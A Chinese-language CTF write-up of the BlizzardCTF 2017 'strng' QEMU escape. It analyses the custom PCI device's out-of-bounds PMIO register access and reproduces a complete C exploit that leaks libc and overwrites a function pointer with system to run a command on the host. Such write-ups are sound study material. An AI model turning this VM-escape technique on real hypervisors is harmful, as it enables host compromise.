# strng

跟着大佬入门下`qemu`逃逸（ctrl c + ctrl + v

可以先看下大佬的一篇`qemu-pwn`[基础知识](https://xz.aliyun.com/t/6562),还有就是大佬的[博客](https://ray-cp.github.io/category/)

[题目下载链接]( https://github.com/rcvalle/blizzardctf2017/releases )

解压后，先看下`launch.sh`

```c
 ruan@ubuntu  ~/vm-escape/vm-escape-master/qemu-escape/BlizzardCTF2017-Strng/pc-bios  cat launch.sh                             
./qemu-system-x86_64 \
    -m 1G \
    -device strng \
    -hda my-disk.img \
    -hdb my-seed.img \
    -nographic \
    -L pc-bios/ \
    -enable-kvm \
    -device e1000,netdev=net0 \
    -netdev user,id=net0,hostfwd=tcp::5555-:22

```

可以用`sudo ./launch.sh`启动， 该虚拟机是一个`Ubuntu Server 14.04 LTS`，用户名是`ubuntu`，密码是`passw0rd`。因为它把22端口重定向到了宿主机的5555端口，所以可以使用`ssh ubuntu@127.0.0.1 -p 5555`登进去，我的机子启动起来挺卡的（要好几分钟`Cloud-init v. 0.7.5 finished at Thu, 19 Dec 2019 02:25:46 +0000. Datasource DataSourceNoCloud [seed=/dev/sdb][dsmode=local].  Up 371.50 seconds`

## 分析

把`qemu-system-x86_64`拖入到IDA里，程序有点大，IDA可能要分析一小会儿，由启动命令里的`-device strng`，所以我们在IDA中搜索与`strng`相关的函数

```c
do_qemu_init_pci_strng_register_types
pci_strng_register_types
strng_class_init
pci_strng_realize
strng_instance_init
strng_mmio_read
strng_mmio_write
strng_pmio_read
strng_pmio_write
```

`STRNGState`结构体

```c
0000000 STRNGState      struc ; (sizeof=0xC10, align=0x10, copyof_3815)
00000000 pdev            PCIDevice_0 ?
000008F0 mmio            MemoryRegion_0 ?
000009F0 pmio            MemoryRegion_0 ?
00000AF0 addr            dd ?
00000AF4 regs            dd 64 dup(?)
00000BF4                 db ? ; undefined
00000BF5                 db ? ; undefined
00000BF6                 db ? ; undefined
00000BF7                 db ? ; undefined
00000BF8 srand           dq ?                    ; offset
00000C00 rand            dq ?                    ; offset
00000C08 rand_r          dq ?                    ; offset
00000C10 STRNGState      ends
```

先看`strng_class_init`

```c
void __fastcall strng_class_init(ObjectClass_0 *a1, void *data)
{
  PCIDeviceClass *v2; // rax

  v2 = object_class_dynamic_cast_assert(a1, "pci-device", "/home/rcvalle/qemu/hw/misc/strng.c", 154, "strng_class_init");
  v2->device_id = 0x11E9;
  v2->revision = 0x10;
  v2->realize = pci_strng_realize;
  v2->class_id = 0xFF;
  v2->vendor_id = 0x1234;
}
```

`device_id`为`0x11E9`，`vendor_id`为`0x1234`,`lspci`看下：

```sh
ubuntu@ubuntu:~$ lspci
00:00.0 Host bridge: Intel Corporation 440FX - 82441FX PMC [Natoma] (rev 02)
00:01.0 ISA bridge: Intel Corporation 82371SB PIIX3 ISA [Natoma/Triton II]
00:01.1 IDE interface: Intel Corporation 82371SB PIIX3 IDE [Natoma/Triton II]
00:01.3 Bridge: Intel Corporation 82371AB/EB/MB PIIX4 ACPI (rev 03)
00:02.0 VGA compatible controller: Device 1234:1111 (rev 02)
00:03.0 Unclassified device [00ff]: Device 1234:11e9 (rev 10)
00:04.0 Ethernet controller: Intel Corporation 82540EM Gigabit Ethernet Controller (rev 03)
```

应该是00:03.0,于是在`lspci -v -s 00:03.0`查看详细信息：

```c
ubuntu@ubuntu:~$ lspci  -v -s 00:03.0
00:03.0 Unclassified device [00ff]: Device 1234:11e9 (rev 10)
	Subsystem: Red Hat, Inc Device 1100
	Physical Slot: 3
	Flags: fast devsel
	Memory at febf1000 (32-bit, non-prefetchable) [size=256]
	I/O ports at c050 [size=8]
```

 有MMIO地址为`0xfebf1000`，大小为256；PMIO地址为`0xc050`，总共有8个端口。 

查看resource文件

```sh
root@ubuntu:/home/ubuntu# cat /sys/devices/pci0000\:00/0000\:00\:03.0/resource
0x00000000febf1000 0x00000000febf10ff 0x0000000000040200
0x000000000000c050 0x000000000000c057 0x0000000000040101
0x0000000000000000 0x0000000000000000 0x0000000000000000
0x0000000000000000 0x0000000000000000 0x0000000000000000
```

根据大佬文中所说 `resource0`对应的是MMIO，而`resource1`对应的是PMIO。`resource`中数据格式是`start-address end-address flags`

对比查看resource文件的信息，可以理解的更好一点:smile:

看完`strng_class_init` ，再看`strng_instance_init`：

```c
void __fastcall strng_instance_init(Object_0 *obj)
{
  STRNGState *v1; // rax

  v1 = object_dynamic_cast_assert(obj, "strng", "/home/rcvalle/qemu/hw/misc/strng.c", 0x91, "strng_instance_init");
  v1->srand = &srand;
  v1->rand = &rand;
  v1->rand_r = &rand_r;
}
```

 函数为`strng Object`赋值了相应的函数指针值`srand`、`rand`以及`rand_r`

接着是看`pci_strng_realize` 

```c
void __fastcall pci_strng_realize(STRNGState *strng, Error_0 **errp)
{
  unsigned __int64 v2; // ST08_8

  v2 = __readfsqword(0x28u);
  memory_region_init_io(&strng->mmio, &strng->pdev.qdev.parent_obj, &strng_mmio_ops, strng, "strng-mmio", 0x100uLL);
  pci_register_bar(&strng->pdev, 0, 0, &strng->mmio);
  memory_region_init_io(&strng->pmio, &strng->pdev.qdev.parent_obj, &strng_pmio_ops, strng, "strng-pmio", 8uLL);
  if ( __readfsqword(0x28u) == v2 )
    pci_register_bar(&strng->pdev, 1, 1u, &strng->pmio);
}
```

 函数注册了MMIO和PMIO空间，包括mmio的操作结构`strng_mmio_ops`及其大小`256`；pmio的操作结构体`strng_pmio_ops`及其大小8

 `strng_mmio_ops`中有访问mmio对应的`strng_mmio_read`以及`strng_mmio_write`；`strng_pmio_ops`中有访问pmio对应的`strng_pmio_read`以及`strng_pmio_write`

```c
data.rel.ro:0000000000A4A220 ; const MemoryRegionOps_0 strng_pmio_ops
.data.rel.ro:0000000000A4A220 strng_pmio_ops  dq offset strng_pmio_read; read
.data.rel.ro:0000000000A4A220                                         ; DATA XREF: pci_strng_realize+5F↑o
.data.rel.ro:0000000000A4A220                 dq offset strng_pmio_write; write
...................................................
.data.rel.ro:0000000000A4A2A0 ; const MemoryRegionOps_0 strng_mmio_ops
.data.rel.ro:0000000000A4A2A0 strng_mmio_ops  dq offset strng_mmio_read; read
.data.rel.ro:0000000000A4A2A0                                         ; DATA XREF: pci_strng_realize+F↑o
.data.rel.ro:0000000000A4A2A0                 dq offset strng_mmio_write; write
....................................................
```

### MMIO

#### strng_mmio_read

```c
uint64_t __fastcall strng_mmio_read(STRNGState *opaque, hwaddr addr, unsigned int size)
{
  uint64_t result; // rax

  result = -1LL;
  if ( size == 4 && !(addr & 3) )
    result = opaque->regs[addr >> 2];
  return result;
}
```

 读入addr将其右移两位，作为`regs`的索引返回该寄存器的值

#### strng_mmio_write

```c
void __fastcall strng_mmio_write(STRNGState *opaque, hwaddr addr, uint64_t val, unsigned int size)
{
  hwaddr i; // rsi
  int v5; // ST08_4
  uint32_t v6; // eax
  unsigned __int64 v7; // [rsp+18h] [rbp-20h]

  v7 = __readfsqword(0x28u);
  if ( size == 4 && !(addr & 3) )
  {
    i = addr >> 2;
    if ( i == 1 )
    {
      opaque->regs[1] = (opaque->rand)(opaque, i, val);
    }
    else if ( i < 1 )
    {
      if ( __readfsqword(0x28u) == v7 )
        (opaque->srand)(val);
    }
    else
    {
      if ( i == 3 )
      {
        v5 = val;
        v6 = (opaque->rand_r)(&opaque->regs[2]);
        LODWORD(val) = v5;
        opaque->regs[3] = v6;
      }
      opaque->regs[i] = val;
    }
  }
}
```

当size为4时，根据addr右移两位进行相应的操作

- i 为 1 时，调用`rand`函数，并把结果赋值给`regs[1]`
- i 为 0 时，调用`srand`函数
- i 为 3 时，以`regs[2]`为参数调用`rand_r`函数，以并把结果赋值给`regs[3]`，但后续的 `opaque->regs[i] = val`还是会把`val`赋值给`regs[3]`
- i 为 其它值时，val直接赋值给`regs[i]`

看起来`addr`可以由我们控制，可以使用`addr`来越界读写`regs`数组。但是事实上是不可以的，前面已经知道了`mmio`空间大小为256，我们传入的addr是不能大于`mmio`的大小；因为pci设备内部会进行检查，而刚好`regs`的大小为256，所以我们无法通过`mmio`进行越界读写,:disappointed:

### PMIO

通过前面的分析我们知道`strng`有八个端口，端口起始地址为`0xc050`，相应的通过`strng_pmio_read`和`strng_pmio_write`去读写

#### strng_pmio_read

```c
uint64_t __fastcall strng_pmio_read(STRNGState *opaque, hwaddr addr, unsigned int size)
{
  uint64_t result; // rax
  uint32_t v4; // edx

  result = -1LL;
  if ( size == 4 )
  {
    if ( addr )
    {
      if ( addr == 4 )
      {
        v4 = opaque->addr;
        if ( !(v4 & 3) )
          result = opaque->regs[v4 >> 2];
      }
    }
    else
    {
      result = opaque->addr;
    }
  }
  return result;
}
```

当size为4时，端口地址为0时，返回`opaque->addr`,地址为4时，把`opaque->addr`右移了两位当作`regs`下标返回`opaque->regs[paque->addr>> 2];`的值

#### strng_pmio_write

```c
void __fastcall strng_pmio_write(STRNGState *opaque, hwaddr addr, uint64_t val, unsigned int size)
{
  uint32_t v4; // eax
  __int64 i; // rax
  unsigned __int64 v6; // [rsp+8h] [rbp-10h]

  v6 = __readfsqword(0x28u);
  if ( size == 4 )
  {
    if ( addr )
    {
      if ( addr == 4 )
      {
        v4 = opaque->addr;
        if ( !(v4 & 3) )
        {
          i = v4 >> 2;
          if ( i == 1 )
          {
            opaque->regs[1] = (opaque->rand)(opaque, 4LL, val);
          }
          else if ( i < 1 )
          {
            if ( __readfsqword(0x28u) == v6 )
              (opaque->srand)(val);
          }
          else if ( i == 3 )
          {
            opaque->regs[3] = (opaque->rand_r)(&opaque->regs[2], 4LL, val);
          }
          else
          {
            opaque->regs[i] = val;
          }
        }
      }
    }
    else
    {
      opaque->addr = val;
    }
  }
}
```

当size为4时，根据传入的端口地址进行相应操作

- 当端口地址为0时，直接把传入的`val`赋值给`opaque->addr`,这里`opaque->addr`是可控的，配合`strng_pmio_read`可以越界读
- 当端口地址不为0时，把`opaque->addr`右移2位赋值给i
  - 当 i 为 1 时，调用`rand`函数，赋值给`regs[1]`
  - 当 i 为 0 时，调用`srand`函数
  - 当 i 为 3 时，以`regs[2]`为参数调用`rand_r`函数，返回值赋给`regs[3]`
  - 其它情况把`val`赋值给`regs[i]`,这里因为`opaque->addr`是可控的，导致 i 也是可控的，于是可以越界写

越界读则是首先通过`strng_pmio_write`去设置`opaque->addr`，然后再调用`pmio_read`去越界读。

越界写则是首先通过`strng_pmio_write`去设置`opaque->addr`，然后仍然通过`pmio_write`去越界写。

### 编程访问mmio和pmio

#### mmio

实现对MMIO空间的访问，比较便捷的方式就是使用`mmap`函数将设备的`resource0`文件映射到内存中，再进行相应的读写即可实现MMIO的读写，典型代码如下：

```c
unsigned char* mmio_mem;

void mmio_write(uint32_t addr, uint32_t value)
{
    *((uint32_t*)(mmio_mem + addr)) = value;
}

uint32_t mmio_read(uint32_t addr)
{
    return *((uint32_t*)(mmio_mem + addr));
}

int main(int argc, char *argv[])
{

    // Open and map I/O memory for the strng device
    int mmio_fd = open("/sys/devices/pci0000:00/0000:00:03.0/resource0", O_RDWR | O_SYNC);
    if (mmio_fd == -1)
        die("mmio_fd open failed");

    mmio_mem = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, 0);
    if (mmio_mem == MAP_FAILED)
        die("mmap mmio_mem failed");
}
```

#### pmio

 通过`IN`以及 `OUT`指令去访问。可以使用`IN`和`OUT`去读写相应字节的1、2、4字节数据（outb/inb, outw/inw, outl/inl），函数的头文件为``<sys/io.h>`

还需要注意的是要访问相应的端口需要一定的权限，程序应使用root权限运行。对于`0x000-0x3ff`之间的端口，使用`ioperm(from, num, turn_on)`即可；对于`0x3ff`以上的端口，则该调用执行`iopl(3)`函数去允许访问所有的端口（可使用`man ioperm` 和`man iopl`去查看函数）。

典型代码如下：

```c
uint32_t pmio_base=0xc050;

uint32_t pmio_write(uint32_t addr, uint32_t value)
{
    outl(value,addr);
}

uint32_t pmio_read(uint32_t addr)
{
    return (uint32_t)inl(addr);
}

int main(int argc, char *argv[])
{

    // Open and map I/O memory for the strng device
    if (iopl(3) !=0 )
        die("I/O permission is not enough");
    pmio_write(pmio_base+0,0);
    pmio_write(pmio_base+4,1);

}
```

## 利用

根据大佬思路：

1. 用`strng_mmio_write`将`cat /root/flag`写入到`regs[2]`开始的内存处，用于后续作为参数。
2. 使用越界读漏洞，读取`regs`数组后面的`srand`地址，根据偏移计算出`system`地址。
3. 使用越界写漏洞，覆盖`regs`数组后面的`rand_r`地址，将其覆盖为`system`地址。
4. 最后使用`strng_mmio_write`触发执行`opaque->rand_r(&opaque->regs[2])`函数，从而实现`system("cat /root/flag")`的调用，拿到flag。

环境是`ubuntu18.04 libc2.27`

大佬的exp:

```c
#include <assert.h>
#include <fcntl.h>
#include <inttypes.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <unistd.h>
#include<sys/io.h>

unsigned char* mmio_mem;
uint32_t pmio_base=0xc050;

void die(const char* msg)
{
    perror(msg);
    exit(-1);
}

void mmio_write(uint32_t addr, uint32_t value)
{
    *((uint32_t*)(mmio_mem + addr)) = value;
}

uint32_t mmio_read(uint32_t addr)
{
    return *((uint32_t*)(mmio_mem + addr));
}

uint32_t pmio_write(uint32_t addr, uint32_t value)
{
    outl(value,addr);
}


uint32_t pmio_read(uint32_t addr)
{
    return (uint32_t)inl(addr);
}

uint32_t pmio_arbread(uint32_t offset)
{
    pmio_write(pmio_base+0,offset);
    return pmio_read(pmio_base+4);
}

void pmio_abwrite(uint32_t offset, uint32_t value)
{
    pmio_write(pmio_base+0,offset);
    pmio_write(pmio_base+4,value);
}

int main(int argc, char *argv[])
{
    
    // Open and map I/O memory for the strng device
    int mmio_fd = open("/sys/devices/pci0000:00/0000:00:03.0/resource0", O_RDWR | O_SYNC);
    if (mmio_fd == -1)
        die("mmio_fd open failed");

    mmio_mem = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, 0);
    if (mmio_mem == MAP_FAILED)
        die("mmap mmio_mem failed");

    printf("mmio_mem @ %p\n", mmio_mem);
    
    mmio_write(8,0x20746163);
    mmio_write(12,0x6f6f722f);
    mmio_write(16,0x6c662f74);
    mmio_write(20,0x6761);

    // Open and map I/O memory for the strng device
    if (iopl(3) !=0 )
        die("I/O permission is not enough");


    // leaking libc address 
    uint64_t srandom_addr=pmio_arbread(0x108);
    srandom_addr=srandom_addr<<32;
    srandom_addr+=pmio_arbread(0x104);
    printf("leaking srandom addr: 0x%llx\n",srandom_addr);
    uint64_t libc_base= srandom_addr-0x43bb0;
    uint64_t system_addr= libc_base+0x4f440;
    printf("libc base: 0x%llx\n",libc_base);
    printf("system addr: 0x%llx\n",system_addr);

    // leaking heap address
    uint64_t heap_addr=pmio_arbread(0x1d0);
    heap_addr=heap_addr<<32;
    heap_addr+=pmio_arbread(0x1cc);
    printf("leaking heap addr: 0x%llx\n",heap_addr);
    uint64_t para_addr=heap_addr+0x39c7c;
    printf("parameter addr: 0x%llx\n",para_addr);

    // overwrite rand_r pointer to system
    pmio_abwrite(0x114,system_addr&0xffffffff);

    mmio_write(0xc,0);    
}
```

## 调试

可以在本机把exp写好，然后用` scp -P5555 exp ubuntu@127.0.0.1:/home/ubuntu `把exp上传到`qemu虚拟机`里,然后本机
```c
sudo gdb attach `pidof qemu-system-x86_64`
```

在相对应的函数处下断点，最后在qemu虚拟机里面`sudo ./exp`就可以调试了

## 总结

跟着大佬走流程来了一遍，初步了解了下qemu的相关知识，orz

参考链接：

[ https://uaf.io/exploitation/2018/05/17/BlizzardCTF-2017-Strng.html ]( https://uaf.io/exploitation/2018/05/17/BlizzardCTF-2017-Strng.html )

[ https://ray-cp.github.io/archivers/qemu-pwn-basic-knowledge ]( https://ray-cp.github.io/archivers/qemu-pwn-basic-knowledge )

[ https://xz.aliyun.com/t/6618 ]( https://xz.aliyun.com/t/6618 )